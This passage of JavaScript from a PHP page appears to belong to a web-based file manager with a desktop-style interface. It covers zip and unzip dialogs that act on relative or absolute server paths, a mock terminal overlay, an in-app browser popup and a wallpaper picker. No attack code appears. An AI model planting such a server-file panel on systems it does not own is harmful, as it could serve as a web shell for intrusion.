                } else {
                    var parts = os.split(/[\\\/]/);
                    var dirAbs = parts.join('/');
                    action = window.location.pathname + '?os=' + encodeURIComponent(dirAbs);
                }
                var fields = rel ? { 'do_zip':'1', 'rel': rel } : { 'do_zip_abs':'1', 'os': os };
                spawnZipWindow({ title: 'Zip: ' + name, action: action, fields: fields, prefill: fmtZipName(), targetName: name });
            } catch(e){}
        }
        function spawnUnzipWindow(opts){
            var tpl = document.getElementById('unzip-template');
            var layer = document.getElementById('unzip-layer');
            if (!tpl || !layer) return null;
            var win = tpl.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            var titleEl = win.querySelector('.rename-title');
            var input = win.querySelector('.unzip-input');
            var saveBtn = win.querySelector('.unzip-save');
            var closeBtn = win.querySelector('.rename-close');
            if (titleEl) titleEl.textContent = opts && opts.title ? opts.title : 'Unzip';
            if (input && opts && opts.prefill) input.value = opts.prefill;
            function doUnzip(){
                var folder = (input && input.value) || '';
                folder = folder.trim();
                if (!folder){ try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Folder name cannot be empty', true); } catch(e){} return; }
                var action = (opts && opts.action) ? opts.action : window.location.pathname;
                var fields = (opts && opts.fields) || {};
                function submitUnzip(){
                    try {
                        var fd = new FormData();
                        Object.keys(fields).forEach(function(k){ fd.append(k, fields[k]); });
                        fd.append('folder', folder);
                        if (saveBtn) saveBtn.disabled = true;
                        var okStatus = false; var didRedirect = false;
                        fetch(action, { method: 'POST', body: fd, redirect: 'follow' })
                            .then(function(res){
                                didRedirect = !!res.redirected || (res.status >= 300 && res.status < 400);
                                okStatus = !!res.ok || didRedirect;
                                return didRedirect ? Promise.resolve('') : res.text();
                            })
                            .then(function(html){
                                var hasError = false, errMsg = '';
                                try {
                                    if (!okStatus) {
                                        hasError = true;
                                    } else if (!didRedirect && html && html.indexOf('class="error"') !== -1) {
                                        hasError = true;
                                        var parser = new DOMParser();
                                        var doc = parser.parseFromString(html || '', 'text/html');
                                        var errEl = doc && doc.querySelector('.error');
                                        errMsg = (errEl && errEl.textContent) ? errEl.textContent.trim() : '';
                                    }
                                } catch(e){}
                                var bodyEl = win.querySelector('.rename-body');
                                var prev = (bodyEl || win).querySelector('.op-status');
                                if (prev) prev.remove();
                                if (hasError) {
                                    var banner = document.createElement('div');
                                    banner.className = 'op-status err';
                                    banner.innerHTML = '<span class="material-symbols-rounded">error</span> Failed' + (errMsg ? ': ' + errMsg : '');
                                    (bodyEl || win).insertBefore(banner, (bodyEl || win).firstChild);
                                    if (saveBtn) saveBtn.disabled = false;
                                    setTimeout(function(){ try { if (banner && banner.parentNode) { banner.remove(); } } catch(e){} }, 2000);
                                } else {
                                    if (saveBtn) {
                                        saveBtn.innerHTML = '<span class="material-symbols-rounded">task_alt</span>';
                                        saveBtn.title = 'Unzip complete';
                                        saveBtn.setAttribute('aria-label', 'Unzip complete');
                                    }
                                    setTimeout(function(){ window.location.href = action; }, 1500);
                                }
                            })
                            .catch(function(){ if (saveBtn) saveBtn.disabled = false; });
                    } catch(err){ if (saveBtn) saveBtn.disabled = false; }
                }
                // Show operation overlay
                try {
                    var overlay = document.getElementById('op-terminal-overlay');
                    var output = document.getElementById('op-term-output');
                    if (overlay && output){
                        overlay.classList.add('show');
                        output.textContent = '$ ';
                        output.textContent += '--sh unzip .. ' + (opts && opts.targetName ? opts.targetName : '') + '\n';
                    }
                } catch(e){}
                submitUnzip();
            }
            saveBtn && saveBtn.addEventListener('click', function(){ doUnzip(); });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            // Drag by titlebar
            var titlebar = win.querySelector('.rename-titlebar');
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
            return win;
        }
        function openUnzipFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                var isAbs = !!u.searchParams.get('unzip_abs');
                var name = baseName(rel || os);
                var defaultFolder = name.replace(/\.zip$/i, '') || name;
                // After unzip, go to parent directory listing
                var action;
                if (rel) {
                    var idx = rel.lastIndexOf('/');
                    var dirRel = idx > -1 ? rel.slice(0, idx) : '';
                    action = window.location.pathname + (dirRel ? ('?d=' + encodeURIComponent(dirRel)) : '');
                } else {
                    var parts = os.split(/[\\\/]/);
                    parts.pop();
                    var dirAbs = parts.join('/');
                    action = window.location.pathname + '?os=' + encodeURIComponent(dirAbs);
                }
                var fields = rel ? { 'do_unzip':'1', 'rel': rel } : { 'do_unzip_abs':'1', 'os': os };
                spawnUnzipWindow({ title: 'Unzip: ' + name, action: action, fields: fields, prefill: defaultFolder, targetName: name });
            } catch(e){}
        }
        // Intercept Zip/Unzip buttons
        document.addEventListener('click', function(ev){
            var a = ev.target && ev.target.closest && ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            if (a.classList.contains('btn-zip') && (href.indexOf('zip=1') !== -1 || href.indexOf('zip_abs=1') !== -1)){
                ev.preventDefault();
                openZipFromHref(href);
            } else if (a.classList.contains('btn-unzip') && (href.indexOf('unzip=1') !== -1 || href.indexOf('unzip_abs=1') !== -1)){
                ev.preventDefault();
                openUnzipFromHref(href);
            }
        }, true);
        })();
    </script>
    <script type="text/javascript">
        // @ts-nocheck
        /* eslint-disable */
        /* global window, document, localStorage */
        (function(){ 'use strict';
        // Simple in-app browser popup
        var browserTrigger = document.getElementById('browser-trigger');
        var browserTemplate = document.getElementById('browser-template');
        var browserLayer = document.getElementById('browser-layer');
        function normalizeUrl(u){
            if (!u) return '';
            var url = u.trim();
            if (/^https?:\/\//i.test(url)) return url;
            return 'https://' + url;
        }
        function toDestination(entry){
            var s = (entry || '').trim();
            if (!s) return '';
            var looksLikeUrl = /^https?:\/\//i.test(s) || /^[\w-]+\.[\w.-]+/.test(s);
            if (looksLikeUrl) return normalizeUrl(s);
            return 'https://www.google.com/search?q=' + encodeURIComponent(s);
        }
        function spawnBrowserWindow(initialUrl){
            if (!browserTemplate || !browserLayer) return null;
            var pre = (function(){ try { return window.__preBrowserClone; } catch(e){ return null; } })();
            var win = pre ? pre : browserTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            browserLayer.appendChild(win);
            // Restore saved position or center initially
            try {
                var savedLeft = parseInt(localStorage.getItem('browser.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('browser.top') || '', 10);
                var bw = win.offsetWidth || 600;
                var bh = win.offsetHeight || 400;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - bw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - bh - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - bw - 6, Math.round((window.innerWidth - bw) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - bh - 6, Math.round((window.innerHeight - bh) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            try { if (pre) window.__preBrowserClone = null; } catch(e){}
            try { window.addOpenApp && window.addOpenApp('browser'); } catch(e){}

            var titlebar = win.querySelector('.browser-titlebar');
            var closeBtn = win.querySelector('.browser-close');
            var urlInput = win.querySelector('.browser-url');
            var goBtn = win.querySelector('.browser-go-btn');
            var openLink = win.querySelector('.browser-open-link');
            var frame = win.querySelector('.browser-frame');
            var body = win.querySelector('.browser-body');
            var landingForm = win.querySelector('.landing-form');
            var landingInput = win.querySelector('.landing-input');
            function setLandingMode(on){ if (!body) return; body.classList.toggle('landing', !!on); }

            function navigate(u){
                var url = toDestination(u || (urlInput ? urlInput.value : ''));
                if (urlInput) urlInput.value = url;
                if (openLink) openLink.href = url;
                try { window.open(url, '_blank', 'noopener'); } catch(e){}
                // Keep landing visible for quick subsequent searches
                setLandingMode(true);
            }
            goBtn && goBtn.addEventListener('click', function(){ navigate(urlInput && urlInput.value); });
            urlInput && urlInput.addEventListener('keydown', function(e){ if (e.key === 'Enter') navigate(urlInput.value); });
            if (openLink) openLink.href = '#';
            landingForm && landingForm.addEventListener('submit', function(e){ e.preventDefault(); navigate(landingInput && landingInput.value); });
            landingInput && landingInput.addEventListener('keydown', function(e){ if (e.key === 'Enter') { e.preventDefault(); navigate(landingInput.value); } });
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try { window.removeOpenApp && window.removeOpenApp('browser'); } catch(e){}
            });

            var draggingWin = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                var r = win.getBoundingClientRect();
                draggingWin = true;
                offX = (e.clientX||0) - r.left;
                offY = (e.clientY||0) - r.top;
                document.body.style.userSelect = 'none';
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if (!draggingWin) return;
                var left = (e.clientX||0) - offX;
                var top = (e.clientY||0) - offY;
                var maxLeft = window.innerWidth - win.offsetWidth - 8;
                var maxTop = window.innerHeight - win.offsetHeight - 8;
                if (left < 8) left = 8; if (top < 8) top = 8;
                if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
                dx = left - (parseInt(win.style.left||'0',10)||0);
                dy = top - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if (!draggingWin) return;
                draggingWin = false;
                win.style.transform = '';
                document.body.style.userSelect = '';
                var left = Math.max(8, Math.min(window.innerWidth - win.offsetWidth - 8, (e.clientX||0) - offX));
                var top = Math.max(8, Math.min(window.innerHeight - win.offsetHeight - 8, (e.clientY||0) - offY));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('browser.left', String(Math.round(rect.left)));
                    localStorage.setItem('browser.top', String(Math.round(rect.top)));
                } catch(err) {}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }

            // Show landing by default; navigate only if an initial URL is provided
            if (initialUrl) navigate(initialUrl); else setLandingMode(true);
            return win;
        }
        browserTrigger && browserTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnBrowserWindow(); });
        // Wallpaper changer
        var wallpaperTrigger = document.getElementById('wallpaper-trigger');
        var wallpaperTemplate = document.getElementById('wallpaper-template');
        var wallpaperLayer = document.getElementById('wallpaper-layer');
        var PRESET_MAC = 'https://images7.alphacoders.com/139/thumb-1920-1393184.png';
        var PRESET_OLD = 'https://images4.alphacoders.com/136/thumb-1920-1361673.png';
        var PRESET_TYPE3 = [
            'radial-gradient(420px 420px at 18% 28%, rgba(64,200,64,0.35), rgba(64,200,64,0) 60%)',
            'radial-gradient(360px 360px at 74% 58%, rgba(90,230,90,0.30), rgba(90,230,90,0) 60%)',
            'radial-gradient(260px 260px at 42% 78%, rgba(40,180,80,0.28), rgba(40,180,80,0) 60%)',
            'linear-gradient(180deg, #041907 0%, #09310f 58%, #0a4e16 100%)'
        ].join(', ');
        var PRESET_TYPE4 = 'https://images5.alphacoders.com/398/thumb-1920-398599.jpg';
        var PRESET_TYPE5 = 'https://images.alphacoders.com/132/thumb-1920-1321753.jpeg'; // Windows XP
        var PRESET_TYPE6 = 'https://images6.alphacoders.com/601/thumb-1920-601846.jpg'; // Windows 10 Pro
        var PRESET_TYPE7 = 'https://images.alphacoders.com/127/thumb-1920-1275722.jpg'; // Windows 11
        var PRESET_TYPE8 = 'https://images2.alphacoders.com/581/thumb-1920-581799.jpg'; // Anonymous Mask
        // New preset types
        var PRESET_TYPE9 = 'https://images8.alphacoders.com/137/thumb-1920-1372177.jpeg';
        var PRESET_TYPE10 = 'https://images2.alphacoders.com/132/thumb-1920-1323478.jpeg';
        var PRESET_TYPE11 = 'https://images8.alphacoders.com/135/thumb-1920-1358903.png';
        var PRESET_TYPE12 = 'https://images3.alphacoders.com/133/thumb-1920-1338606.png';
        // Additional presets (Types 13–23) from user list
        var PRESET_TYPE13 = 'https://images7.alphacoders.com/567/thumb-1920-567918.png';
        var PRESET_TYPE14 = 'https://images2.alphacoders.com/137/thumb-1920-1377396.png';
        var PRESET_TYPE15 = 'https://images5.alphacoders.com/338/thumb-1920-338822.jpg';
        var PRESET_TYPE16 = 'https://images4.alphacoders.com/407/thumb-1920-40726.jpg';
        var PRESET_TYPE17 = 'https://images4.alphacoders.com/138/thumb-1920-1382307.png';
        var PRESET_TYPE18 = 'https://images3.alphacoders.com/132/thumb-1920-1328396.png';
        var PRESET_TYPE19 = 'https://images5.alphacoders.com/526/thumb-1920-526887.jpg';
        var PRESET_TYPE20 = 'https://images2.alphacoders.com/135/thumb-1920-1355112.jpeg';
        var PRESET_TYPE21 = 'https://images7.alphacoders.com/134/thumb-1920-1341150.png';
        var PRESET_TYPE22 = 'https://images4.alphacoders.com/136/thumb-1920-1360883.jpeg';
        var PRESET_TYPE23 = 'https://images5.alphacoders.com/528/thumb-1920-528725.jpg';
        var PRESET_TYPE24 = 'https://images2.alphacoders.com/132/thumb-1920-1325726.png';
        var fallbackWallpaper = <?= json_encode($wallpaperUrl) ?>;
        function setWallpaper(value){
            if (!value) return;
            try {
                var isGradient = /^\s*(?:linear|radial)-gradient\(/.test(value);
                var cssValue = isGradient ? value : "url('" + value.replace(/'/g, "\\'") + "')";
                document.documentElement.style.setProperty('--wallpaper', cssValue);
            } catch(e) {}
        }
        (function loadSaved(){
            try {
                var type = localStorage.getItem('coding.wallpaper.type') || '';
                var saved = localStorage.getItem('coding.wallpaper');
                if (type === 'type1') setWallpaper(PRESET_MAC);
                else if (type === 'type2') setWallpaper(PRESET_OLD);
                else if (type === 'type3') setWallpaper(PRESET_TYPE3);
                else if (type === 'type4') setWallpaper(PRESET_TYPE4);
                else if (type === 'type5') setWallpaper(PRESET_TYPE5);
                else if (type === 'type6') setWallpaper(PRESET_TYPE6);
                else if (type === 'type7') setWallpaper(PRESET_TYPE7);
                else if (type === 'type8') setWallpaper(PRESET_TYPE8);
                else if (type === 'type9') setWallpaper(PRESET_TYPE9);
                else if (type === 'type10') setWallpaper(PRESET_TYPE10);
                else if (type === 'type11') setWallpaper(PRESET_TYPE11);
                else if (type === 'type12') setWallpaper(PRESET_TYPE12);
                else if (type === 'type13') setWallpaper(PRESET_TYPE13);
                else if (type === 'type14') setWallpaper(PRESET_TYPE14);
                else if (type === 'type15') setWallpaper(PRESET_TYPE15);
                else if (type === 'type16') setWallpaper(PRESET_TYPE16);
                else if (type === 'type17') setWallpaper(PRESET_TYPE17);
                else if (type === 'type18') setWallpaper(PRESET_TYPE18);
                else if (type === 'type19') setWallpaper(PRESET_TYPE19);
                else if (type === 'type20') setWallpaper(PRESET_TYPE20);
                else if (type === 'type21') setWallpaper(PRESET_TYPE21);
                else if (type === 'type22') setWallpaper(PRESET_TYPE22);
                else if (type === 'type23') setWallpaper(PRESET_TYPE23);
                else if (type === 'type24') setWallpaper(PRESET_TYPE24);
                else if (saved) setWallpaper(saved);
                else setWallpaper(fallbackWallpaper);
            } catch(e) { setWallpaper(fallbackWallpaper); }
        })();
        function spawnWallpaperWindow(){
            if (!wallpaperTemplate || !wallpaperLayer) return null;
            var win = wallpaperTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            wallpaperLayer.appendChild(win);
            try { window.addOpenApp && window.addOpenApp('wallpaper'); } catch(e){}
            var closeBtn = win.querySelector('.wallpaper-close');
            var urlInput = win.querySelector('.wp-url');
            var applyBtn = win.querySelector('.wp-apply');
            var resetBtn = win.querySelector('.wp-reset');
            var type1Btn = win.querySelector('.wp-type1');
            var type2Btn = win.querySelector('.wp-type2');
            var type3Btn = win.querySelector('.wp-type3');
            var type4Btn = win.querySelector('.wp-type4');
            var type5Btn = win.querySelector('.wp-type5');
            var type6Btn = win.querySelector('.wp-type6');
            var type7Btn = win.querySelector('.wp-type7');
            var type8Btn = win.querySelector('.wp-type8');
            var type9Btn = win.querySelector('.wp-type9');
            var type10Btn = win.querySelector('.wp-type10');
            var type11Btn = win.querySelector('.wp-type11');
            var type12Btn = win.querySelector('.wp-type12');
            var type13Btn = win.querySelector('.wp-type13');
            var type14Btn = win.querySelector('.wp-type14');
            var type15Btn = win.querySelector('.wp-type15');
            var type16Btn = win.querySelector('.wp-type16');
            var type17Btn = win.querySelector('.wp-type17');
            var type18Btn = win.querySelector('.wp-type18');
            var type19Btn = win.querySelector('.wp-type19');
            var type20Btn = win.querySelector('.wp-type20');
            var type21Btn = win.querySelector('.wp-type21');
            var type22Btn = win.querySelector('.wp-type22');
            var type23Btn = win.querySelector('.wp-type23');
            var type24Btn = win.querySelector('.wp-type24');
            // Populate thumbnails next to type buttons
            try {
                var pairs = [
                    ['type1', PRESET_MAC], ['type2', PRESET_OLD], ['type3', PRESET_TYPE3], ['type4', PRESET_TYPE4],
                    ['type5', PRESET_TYPE5], ['type6', PRESET_TYPE6], ['type7', PRESET_TYPE7], ['type8', PRESET_TYPE8],
                    ['type9', PRESET_TYPE9], ['type10', PRESET_TYPE10], ['type11', PRESET_TYPE11], ['type12', PRESET_TYPE12],
                    ['type13', PRESET_TYPE13], ['type14', PRESET_TYPE14], ['type15', PRESET_TYPE15], ['type16', PRESET_TYPE16],
                    ['type17', PRESET_TYPE17], ['type18', PRESET_TYPE18], ['type19', PRESET_TYPE19], ['type20', PRESET_TYPE20],
                    ['type21', PRESET_TYPE21], ['type22', PRESET_TYPE22], ['type23', PRESET_TYPE23], ['type24', PRESET_TYPE24]
                ];
                pairs.forEach(function(p){
                    var t = p[0], src = p[1];
                    var btn = win.querySelector('.wp-' + t);
                    if (!btn) return;
                    var thumb = btn.querySelector('.wp-thumb');
                    if (!thumb) return;
                    var isGrad = typeof src === 'string' && /^\s*(?:linear|radial)-gradient\(/.test(src);
                    thumb.style.backgroundImage = isGrad ? src : "url('" + String(src).replace(/'/g, "\\'") + "')";
                });
            } catch(e) {}
            // Restore saved position
            try {
                var left = parseInt(localStorage.getItem('wallpaper.left') || '', 10);
                var top = parseInt(localStorage.getItem('wallpaper.top') || '', 10);
                if (!isNaN(left) && !isNaN(top)) {
                    win.style.left = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, left)) + 'px';
                    win.style.top = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, top)) + 'px';
                } else {
                    // Center by default if no saved position
                    var ww = win.offsetWidth || 520;
                    var wh = win.offsetHeight || 360;
                    var cx = Math.max(6, Math.min(window.innerWidth - ww - 6, Math.round((window.innerWidth - ww) / 2)));
                    var cy = Math.max(6, Math.min(window.innerHeight - wh - 6, Math.round((window.innerHeight - wh) / 2)));
                    win.style.left = cx + 'px';
                    win.style.top = cy + 'px';
                }
            } catch(e) {}
            try {
                var saved = localStorage.getItem('coding.wallpaper');
                if (saved && urlInput) urlInput.value = saved;
            } catch(e) {}
            applyBtn && applyBtn.addEventListener('click', function(){
                var url = (urlInput && urlInput.value || '').trim();
                if (!url) return;
                setWallpaper(url);
                try {
                    localStorage.setItem('coding.wallpaper', url);
                    localStorage.setItem('coding.wallpaper.type', 'custom');
                } catch(e) {}
            });
            type1Btn && type1Btn.addEventListener('click', function(){
                setWallpaper(PRESET_MAC);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type1');
                    localStorage.setItem('coding.wallpaper', PRESET_MAC);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type2Btn && type2Btn.addEventListener('click', function(){
                setWallpaper(PRESET_OLD);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type2');
                    localStorage.setItem('coding.wallpaper', PRESET_OLD);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type3Btn && type3Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE3);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type3');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE3);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type4Btn && type4Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE4);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type4');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE4);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type5Btn && type5Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE5);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type5');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE5);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type6Btn && type6Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE6);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type6');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE6);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type7Btn && type7Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE7);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type7');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE7);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type8Btn && type8Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE8);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type8');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE8);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type9Btn && type9Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE9);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type9');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE9);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type10Btn && type10Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE10);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type10');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE10);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type11Btn && type11Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE11);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type11');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE11);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type12Btn && type12Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE12);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type12');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE12);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type13Btn && type13Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE13);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type13');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE13);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type14Btn && type14Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE14);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type14');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE14);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type15Btn && type15Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE15);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type15');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE15);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type16Btn && type16Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE16);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type16');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE16);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type17Btn && type17Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE17);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type17');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE17);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type18Btn && type18Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE18);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type18');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE18);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type19Btn && type19Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE19);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type19');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE19);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type20Btn && type20Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE20);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type20');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE20);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type21Btn && type21Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE21);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type21');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE21);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type22Btn && type22Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE22);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type22');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE22);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type23Btn && type23Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE23);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type23');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE23);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type24Btn && type24Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE24);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type24');
                    localStorage.setItem('coding.wallpaper', PRESET_TYPE24);
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            resetBtn && resetBtn.addEventListener('click', function(){
                try {
                    localStorage.removeItem('coding.wallpaper');
                    localStorage.removeItem('coding.wallpaper.type');
                } catch(e) {}
                // Reset to project default list's first entry
                var DEFAULT_WALLPAPERS = [
                    'https://images2.alphacoders.com/132/thumb-1920-1325726.png',
                    'https://images2.alphacoders.com/137/thumb-1920-1377396.png',
                    'https://images5.alphacoders.com/338/thumb-1920-338822.jpg',
                    'https://images4.alphacoders.com/407/thumb-1920-40726.jpg',
                    'https://images4.alphacoders.com/138/thumb-1920-1382307.png',
                    'https://images3.alphacoders.com/132/thumb-1920-1328396.png',
                    'https://images5.alphacoders.com/526/thumb-1920-526887.jpg',
                    'https://images2.alphacoders.com/135/thumb-1920-1355112.jpeg',
                    'https://images7.alphacoders.com/134/thumb-1920-1341150.png',
                    'https://images4.alphacoders.com/136/thumb-1920-1360883.jpeg',
                    'https://images5.alphacoders.com/528/thumb-1920-528725.jpg'
                ];
                setWallpaper(DEFAULT_WALLPAPERS[0]);
            });
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try { window.removeOpenApp && window.removeOpenApp('wallpaper'); } catch(e){}
            });
            // Drag by titlebar
            var titlebar = win.querySelector('.wallpaper-titlebar');
            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                var r = win.getBoundingClientRect();
                dragging = true;
                offX = (e.clientX||0) - r.left;
                offY = (e.clientY||0) - r.top;
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if (!dragging) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                dx = x - (parseInt(win.style.left||'0',10)||0);
                dy = y - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if (!dragging) return;
                dragging = false;
                win.style.transform = '';
                var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
